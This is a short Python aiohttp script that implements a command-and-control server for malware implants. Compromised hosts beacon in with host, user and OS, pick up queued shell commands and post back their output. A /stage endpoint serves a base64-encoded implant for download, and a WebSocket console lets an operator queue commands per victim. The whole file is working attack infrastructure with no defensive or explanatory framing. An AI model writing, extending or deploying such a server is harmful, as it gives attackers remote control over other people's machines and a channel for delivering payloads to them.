import asyncio
import base64
import json
from aiohttp import web, WSMsgType

SECRET = None
pending = {}  # cid -> asyncio.Queue
implant_src = b""

async def beacon(request):
    data = await request.json()
    if data.get("secret") != SECRET:
        return web.Response(status=403)

    host = data.get("host", "unknown")
    user = data.get("user", "?")
    os_name = data.get("os", "?")
    cid = f"{host}:{user}:{os_name}"

    if cid not in pending:
        pending[cid] = asyncio.Queue()
        print(f"[+] new implant: {cid}")

    try:
        cmd = pending[cid].get_nowait()
    except asyncio.QueueEmpty:
        cmd = None

    return web.json_response({"cmd": cmd, "id": cid})

async def output(request):
    data = await request.json()
    if data.get("secret") != SECRET:
        return web.Response(status=403)
    print(f"[out] {data.get('output', '')}")
    return web.json_response({"ok": True})

async def stage(request):
    if request.query.get("secret") != SECRET:
        return web.Response(status=403)
    return web.Response(body=base64.b64encode(implant_src), content_type="text/plain")

async def ws_handler(request):
    ws = web.WebSocketResponse()
    await ws.prepare(request)
    await ws.send_str(json.dumps({"implants": list(pending.keys())}))

    async for msg in ws:
        if msg.type != WSMsgType.TEXT:
            continue
        try:
            payload = json.loads(msg.data)

            if payload.get("op") == "list":
                await ws.send_str(json.dumps({"implants": list(pending.keys())}))
                continue

            cid = payload.get("id")
            cmd = payload.get("cmd")
            if cid in pending:
                await pending[cid].put(cmd)
                await ws.send_str(f"queued for {cid}")
            else:
                await ws.send_str(f"unknown id {cid}")
        except Exception as e:
            await ws.send_str(f"err: {e}")

    return ws

def main(host, port, secret, implant_path=None):
    global SECRET, implant_src
    SECRET = secret
    if implant_path and os.path.exists(implant_path):
        with open(implant_path, "rb") as f:
            implant_src = f.read()

    app = web.Application()
    app.router.add_post("/beacon", beacon)
    app.router.add_post("/output", output)
    app.router.add_get("/stage", stage)
    app.router.add_get("/ws", ws_handler)
    print(f"[*] c2 listening on {host}:{port}")
    web.run_app(app, host=host, port=port)

if __name__ == "__main__":
    import os
    import sys
    main(
        sys.argv[1] if len(sys.argv) > 1 else "0.0.0.0",
        int(sys.argv[2]) if len(sys.argv) > 2 else 8443,
        sys.argv[3] if len(sys.argv) > 3 else "changeme",
        sys.argv[4] if len(sys.argv) > 4 else None,
    )
